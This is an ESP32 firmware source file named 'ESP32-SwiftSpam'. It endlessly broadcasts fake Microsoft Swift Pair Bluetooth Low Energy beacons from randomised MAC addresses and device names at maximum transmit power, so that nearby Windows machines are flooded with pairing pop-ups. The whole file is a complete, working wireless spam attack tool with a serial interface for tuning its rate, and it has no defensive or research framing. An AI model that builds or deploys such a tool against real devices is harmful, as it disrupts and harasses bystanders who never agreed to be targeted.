#include <NimBLEDevice.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/queue.h>

const char* ver = "1.2.0";
bool SDEBUG = false; // Set to true to enable serial debug info
// Ajdustable device name length
int DEVICE_NAME_LENGTH = 8; // Set to 0 to disable names entirely. Maximum length: 23
// Spam delay parameters
const unsigned short MIN_DELAY = 10;    // Minimum delay in milliseconds
const unsigned short MAX_DELAY = 1000;  // Maximum delay in milliseconds
unsigned short currentDelay = 130;      // Default delay in milliseconds

// Shared variables for inter-task communication
QueueHandle_t payloadQueue; // Queue to pass payload data between tasks
struct PayloadData {
    char* deviceName; // Dynamically allocated device name buffer
    uint8_t mac[6];      // Random MAC address
    uint8_t advData[31]; // Advertisement data
    uint8_t advDataLen;  // Length of advertisement data
    bool hasName;        // Flag to indicate if a name is included
};

// Function to generate a random device name
void generateRandomDeviceName(char* name, int nameLength) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-/()=[]{}@!?.;,:/*$%+\\#<>";

    for (int i = 0; i < nameLength; i++) {
        name[i] = charset[random(sizeof(charset) - 1)];
    }
    name[nameLength] = '\0'; // Null-terminate the string
}

// Function to generate a random MAC address
void generateRandomMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256); // Generate a random byte for each part of the MAC
    }
    mac[0] &= 0xFE; // Ensure the MAC is unicast (LSB of the first byte is 0)
    mac[0] |= 0x02; // Ensure the MAC is locally administered (second LSB of the first byte is 1)
}

// Function to generate SwiftPair advertisement data
void generateSwiftPairAdvertisementData(const char* deviceName, uint8_t* advData, uint8_t* advDataLen, bool hasName) {
    if (hasName) {
        uint8_t nameLen = strlen(deviceName);
        *advDataLen = 7 + nameLen; // BLE payload length (7 bytes for header + name length)

        int i = 0;
        advData[i++] = *advDataLen - 1; // Length of this block
        advData[i++] = 0xFF;           // Manufacturer Specific Data type
        advData[i++] = 0x06;           // Microsoft Vendor ID (LSB)
        advData[i++] = 0x00;           // Microsoft Vendor ID (MSB)
        advData[i++] = 0x03;           // Beacon ID (3 = Microsoft-specific ID)
        advData[i++] = 0x00;           // Flags (0x00) - Microsoft Beacon Sub Scenario
        advData[i++] = 0x80;           // Flags (0x80) - Reserved RSSI Byte
        memcpy(&advData[i], deviceName, nameLen); // Include the device name
    } else {
        // No name, only include the header
        *advDataLen = 7; // BLE payload length (7 bytes for header)

        int i = 0;
        advData[i++] = *advDataLen - 1; // Length of this block
        advData[i++] = 0xFF;           // Manufacturer Specific Data type
        advData[i++] = 0x06;           // Microsoft Vendor ID (LSB)
        advData[i++] = 0x00;           // Microsoft Vendor ID (MSB)
        advData[i++] = 0x03;           // Beacon ID (3 = Microsoft-specific ID)
        advData[i++] = 0x00;           // Flags (0x00) - Microsoft Beacon Sub Scenario
        advData[i++] = 0x80;           // Flags (0x80) - Reserved RSSI Byte
    }
}

// Task to generate random data and construct the payload
void generateDataTask(void* parameter) {
    while (1) {
        // Generate a random MAC address
        uint8_t mac[6];
        generateRandomMac(mac);

        // Generate SwiftPair advertisement data
        uint8_t advData[31];
        uint8_t advDataLen;
        bool hasName = (DEVICE_NAME_LENGTH > 0);

        char* deviceName = (char*)malloc(DEVICE_NAME_LENGTH + 1); // Dynamically allocate device name buffer
        if (hasName) {
            generateRandomDeviceName(deviceName, DEVICE_NAME_LENGTH);
        }

        generateSwiftPairAdvertisementData(deviceName, advData, &advDataLen, hasName);

        // Create a payload struct
        PayloadData payload;
        payload.deviceName = deviceName; // Assign the dynamically allocated buffer
        memcpy(payload.mac, mac, 6);
        memcpy(payload.advData, advData, 31);
        payload.advDataLen = advDataLen;
        payload.hasName = hasName;

        // Send the payload to the BLE task
        if (xQueueSend(payloadQueue, &payload, portMAX_DELAY) != pdTRUE) {
            Serial.println("[-] Failed to send payload to queue");
        }

        // Add a small delay to avoid overwhelming the queue
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

// Task to handle BLE operations
void bleTask(void* parameter) {
    while (1) {
        // Wait for a payload from the queue
        PayloadData payload;
        if (xQueueReceive(payloadQueue, &payload, portMAX_DELAY) == pdTRUE) {
            // Initialize BLE
            NimBLEDevice::init("");
            NimBLEDevice::setPower(9); // Set to max TX power

            // Set the random MAC address
            NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
            NimBLEDevice::setOwnAddr(payload.mac);

            // Create BLE server
            NimBLEServer* pServer = NimBLEDevice::createServer();

            // Get advertising object
            NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();

            // Set advertisement data
            NimBLEAdvertisementData advertisementData;
            advertisementData.addData(payload.advData, payload.advDataLen);
            pAdvertising->setAdvertisementData(advertisementData);

            // Start advertising
            pAdvertising->start();

            // Print debug info
            if (SDEBUG) {
                if (payload.hasName) {
                    Serial.printf("\n[+] Advertising Swift Pair device: %s\n", payload.deviceName);
                } else {
                    Serial.println("\n[+] Advertising Swift Pair device: null");
                }
                Serial.printf("[+] Using random source MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                              payload.mac[0], payload.mac[1], payload.mac[2],
                              payload.mac[3], payload.mac[4], payload.mac[5]);
            }

            // Wait for the set delay (in ms) before sending the next beacon
            vTaskDelay(pdMS_TO_TICKS(currentDelay));

            // Stop advertising
            pAdvertising->stop();

            // Clean up BLE resources
            NimBLEDevice::deinit();

            // Free the dynamically allocated device name buffer
            if (payload.hasName) {
                free(payload.deviceName);
            }
        }
    }
}

void setup() {
    // Initialize serial console
    Serial.begin(115200);
    Serial.printf("\nESP32-SwiftSpam ver.: %s\n", ver);
    Serial.println("\n[>>] Starting ESP32-SwiftSpam...");
    Serial.println("Use 'set delay <10-1000>' to change the delay (ms)");
    Serial.println("Use 'set name len <0-23>' to change the device name length");
    Serial.printf("\n[+] Spam delay set to: %lums\n", currentDelay);
    Serial.printf("[+] Device name length set to: %d\n", DEVICE_NAME_LENGTH);

    // Set the initial random seed
    randomSeed(analogRead(0));

    // Create a queue to pass payload data between tasks
    payloadQueue = xQueueCreate(10, sizeof(PayloadData));
    if (payloadQueue == NULL) {
        Serial.println("\n[-] FATAL: Failed to create queue");
        while (1); // Halt if the queue cannot be created
    }

    // Create the generateDataTask and bleTask
    xTaskCreatePinnedToCore(generateDataTask, "GenerateDataTask", 10000, NULL, 1, NULL, 0); // Run on Core 0
    xTaskCreatePinnedToCore(bleTask, "BLETask", 10000, NULL, 1, NULL, 1); // Run on Core 1
}

void loop() {
    // Check if there is data available on the serial port
    if (Serial.available() > 0) {
        String input = Serial.readStringUntil('\n'); // Read the incoming data
        input.trim(); // Remove any extra whitespace or newline characters

        // Check if the input starts with "set delay"
        if (input.startsWith("set delay ")) {
            // Extract the delay value from the command
            String delayValueStr = input.substring(10); // "set delay " is 10 characters long
            unsigned long newDelay = delayValueStr.toInt(); // Convert to integer

            // Validate the new delay value
            if (newDelay >= MIN_DELAY && newDelay <= MAX_DELAY) {
                currentDelay = newDelay; // Update the delay value
                Serial.printf("\n[+] New spam delay set to: %lums\n", currentDelay);
            } else {
                Serial.println("\n[-] Invalid delay value. Please enter a value between 10 and 1000 (ms)");
            }
        }
        // Check if the input starts with "set name len"
        else if (input.startsWith("set name len ")) {
            // Extract the name length value from the command
            String nameLenStr = input.substring(13); // "set name len " is 13 characters long
            int newNameLen = nameLenStr.toInt(); // Convert to integer

            // Validate the new name length value
            if (newNameLen >= 0 && newNameLen <= 23) {
                DEVICE_NAME_LENGTH = newNameLen; // Update the device name length
                Serial.printf("\n[+] New device name length set to: %d\n", DEVICE_NAME_LENGTH);
                if (DEVICE_NAME_LENGTH == 0) {
                    Serial.println("\n[+] Device name disabled");
                }
            } else {
                Serial.println("\n[-] Invalid name length. Please enter a value between 0 and 23");
            }
        } else {
            Serial.println("\n[-] Invalid command. Use 'set delay <10-1000>' or 'set name len <0-23>'");
        }
    }

    // FreeRTOS scheduler will handle the tasks
    vTaskDelay(pdMS_TO_TICKS(50)); // Small delay to avoid hogging the CPU
}
